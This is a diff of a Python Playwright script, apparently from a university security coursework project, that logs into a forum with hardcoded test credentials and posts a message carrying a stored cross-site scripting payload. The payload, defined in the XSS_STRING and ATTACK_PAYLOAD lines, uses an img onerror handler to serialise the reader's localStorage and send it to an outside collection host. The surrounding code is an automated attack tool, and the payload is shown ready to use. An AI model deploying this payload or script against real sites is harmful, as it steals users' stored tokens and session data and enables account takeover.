@@ -3,14 +3,14 @@ import threading
 from playwright.sync_api import sync_playwright
 
 # Configuration
+XSS_STRING = """<img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">"""
+
 DEFAULT_WEB_URL = "https://elec0138-forum.0138019.xyz/"
 DEFAULT_USERNAME = "tr1"
 DEFAULT_PASSWORD = "12345678"
 
 ATTACK_PAYLOAD_IDENTIFIER = "counted 812.13 stars."
-ATTACK_PAYLOAD = \
-    f"I looked up at the sky tonight and {ATTACK_PAYLOAD_IDENTIFIER}" + \
-    """<img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">"""
+ATTACK_PAYLOAD = f"I looked up at the sky tonight and {ATTACK_PAYLOAD_IDENTIFIER} {XSS_STRING}"
 
 
 def login_page(page, username: str, password: str):
